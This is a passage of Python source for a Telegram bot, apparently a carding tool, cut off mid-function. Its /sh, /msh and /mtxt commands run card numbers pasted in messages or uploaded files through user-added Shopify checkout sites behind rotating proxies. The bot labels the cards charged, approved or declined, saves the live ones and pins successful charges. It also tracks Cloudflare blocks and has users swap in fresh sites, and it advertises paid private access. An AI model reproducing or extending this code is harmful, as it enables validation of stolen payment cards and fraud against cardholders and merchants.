            return await event.reply("❌ 𝙋𝙧𝙤𝙭𝙮 𝙇𝙞𝙢𝙞𝙩 𝙍𝙚𝙖𝙘𝙝𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙪𝙥 𝙩𝙤 10 𝙥𝙧𝙤𝙭𝙞𝙚𝙨.\n𝙐𝙨𝙚 /rmpxy 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙤𝙡𝙙 𝙤𝙣𝙚𝙨.")
        for existing_proxy in user_proxies:
            if existing_proxy['proxy_url'] == proxy_data['proxy_url']:
                return await event.reply("⚠️ 𝙏𝙝𝙞𝙨 𝙥𝙧𝙤𝙭𝙮 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙖𝙙𝙙𝙚𝙙!")
        proxy_type_display = proxy_data.get('type', 'http').upper()
        testing_msg = await event.reply(f"🔄 𝙏𝙚𝙨𝙩𝙞𝙣𝙜 {proxy_type_display} 𝙥𝙧𝙤𝙭𝙮...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])
        if not is_working:
            await testing_msg.edit(f"❌ 𝙋𝙧𝙤𝙭𝙮 𝙞𝙨 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜!\n\n𝙀𝙧𝙧𝙤𝙧: {result}")
            return
        user_proxies.append(proxy_data)
        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
        auth_display = f"👤 {proxy_data['username']}" if proxy_data.get('username') else "🔓 No Auth"
        await testing_msg.edit(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙖𝙙𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!\n\n🌐 𝙀𝙭𝙩𝙚𝙧𝙣𝙖𝙡 𝙄𝙋: {result}\n📍 𝙋𝙧𝙤𝙭𝙮: {proxy_data['ip']}:{proxy_data['port']}\n🔐 𝙏𝙮𝙥𝙚: {proxy_type_display}\n{auth_display}\n📊 𝙏𝙤𝙩𝙖𝙡 𝙋𝙧𝙤𝙭𝙞𝙚𝙨: {len(user_proxies)}/10")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy(event):
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!")
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 1:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rmpxy <index>\n𝙊𝙧: /rmpxy all\n\n𝙐𝙨𝙚 /proxy 𝙩𝙤 𝙨𝙚𝙚 𝙞𝙣𝙙𝙚𝙭 𝙣𝙪𝙢𝙗𝙚𝙧𝙨")
        arg = parts[1].strip().lower()
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(f"✅ 𝘼𝙡𝙡 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!")
        try:
            index = int(arg) - 1
            if index < 0 or index >= len(user_proxies):
                return await event.reply(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 (1-{len(user_proxies)})")
            removed_proxy = user_proxies.pop(index)
            if user_proxies:
                proxies[str(event.sender_id)] = user_proxies
            else:
                del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            await event.reply(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(user_proxies)}")
        except ValueError:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙐𝙨𝙚: /rmpxy 1 𝙤𝙧 /rmpxy all")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        user_proxies = await get_all_user_proxies(event.sender_id)
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!\n\n𝙐𝙨𝙚 /addpxy 𝙩𝙤 𝙖𝙙𝙙 𝙤𝙣𝙚.")
        proxy_list = f"📡 **𝙔𝙤𝙪𝙧 𝙋𝙧𝙤𝙭𝙞𝙚𝙨** ({len(user_proxies)}/10)\n\n"
        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_type = proxy_data.get('type', 'http').upper()
            auth_info = ""
            if proxy_data.get('username'):
                auth_info = f" | 👤 {proxy_data['username']}"
            proxy_list += f"`{idx}.` 🔐 {proxy_type} | 📍 {proxy_data['ip']}:{proxy_data['port']}{auth_info}\n"
        proxy_list += f"\n**ℹ️ 𝙄𝙣𝙛𝙤:**\n• Bot uses random proxy for each check\n• Dead proxies are auto-removed\n• Supports HTTP, HTTPS, SOCKS4, SOCKS5\n• Use `/rmpxy <index>` to remove specific proxy\n• Use `/rmpxy all` to remove all proxies"
        await event.reply(proxy_list)
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# ── Shopify Single Check (/sh) ──

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
        if not card:
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /𝙨𝙝 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card:
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /sh 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /𝙖𝙙𝙙")
    loading_msg = await event.reply("🍳")
    start_time = time.time()
    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except:
                break
    loading_task = asyncio.create_task(animate_loading())
    sem = get_semaphore(event.sender_id, 'sp', SP_PER_USER_WORKERS)
    try:
        async with sem:
            res, site_index, used_site = await check_card_with_retry(card, user_sites, event.sender_id)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        is_charged = False
        if "charged" in response_text or "charged" in status_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "cloudflare bypass failed" in response_text:
            status_header = " 𝙇𝙊𝙐     𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
        site_display = site_index if site_index > 0 else "?"
        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_display}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged:
            await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# ── Shopify Mass Check from text (/msh) ──

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
        if not cards:
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙨𝙝.```")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("𝙔𝙤𝙪𝙧 𝘼𝙧𝙚𝙚 𝙣𝙤𝙩 𝘼𝙙𝙙𝙚𝙙 𝘼𝙣𝙮 𝙐𝙧𝙡 𝙁𝙞𝙧𝙨𝙩 𝘼𝙙𝙙 𝙐𝙧𝙡")
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    sent_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    sem = get_semaphore(event.sender_id, 'msp', MSP_PER_USER_WORKERS)
    batch_size = BATCH_SIZE
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = []
        for card in batch:
            tasks.append(
                asyncio.create_task(
                    _run_with_semaphore(sem, check_card_with_retry, card, sites, event.sender_id)
                )
            )
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for j, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = ({"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}, -1, None)
            res, site_index, used_site = result
            start_time = time.time()
            end_time = time.time()
            elapsed_time = round(end_time - start_time, 2)
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = res.get("Response", "").lower()
            status_text = res.get("Status", "").lower()
            is_charged = False
            if "charged" in response_text or "charged" in status_text:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
            elif "cloudflare bypass failed" in response_text:
                status_header = "   𝙐𝘿𝙁𝙇  𝙀  𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                res["Response"] = "Cloudflare spotted 🤡 change site or try again"
            elif "thank you" in response_text or "payment successful" in response_text:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
            elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_result = "Approved"
                await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
            else:
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                status_result = "Declined"
            site_display = site_index if site_index > 0 else "?"
            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_display}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
            result_msg = await event.reply(card_msg)
            if is_charged:
                await pin_charged_message(event, result_msg)
    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")

# ── Shopify Mass from TXT (/mtxt) ──

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id:
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try:
                os.remove(file_path)
            except:
                pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards:
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else:
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites:
            return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_mtxt_cards(event, cards, local_sites):
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    sem = get_semaphore(user_id, 'msp', MSP_PER_USER_WORKERS)
    try:
        batch_size = BATCH_SIZE
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break
            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []
            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try:
                    await status_msg.edit(final_caption, buttons=final_buttons)
                except:
                    pass
                return
            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                tasks.append(
                    asyncio.create_task(
                        _run_with_semaphore(sem, check_card_with_retry, card, local_sites, user_id)
                    )
                )
                task_cards.append(card)
            if not tasks:
                continue
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for j, (card, result) in enumerate(zip(task_cards, results)):
                if user_id not in ACTIVE_MTXT_PROCESSES:
                    break
                if isinstance(result, Exception):
                    result = ({"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}, -1, None)
                res, site_index, used_site = result
                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                response_text = res.get("Response", "")
                response_text_lower = response_text.lower()
                if is_site_dead(response_text):
                    declined += 1
                    if used_site and used_site in local_sites:
                        local_sites.remove(used_site)
                        all_sites_data = await load_json(SITE_FILE)
                        if str(user_id) in all_sites_data and used_site in all_sites_data[str(user_id)]:
                            all_sites_data[str(user_id)].remove(used_site)
                            await save_json(SITE_FILE, all_sites_data)
                    if not local_sites:
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
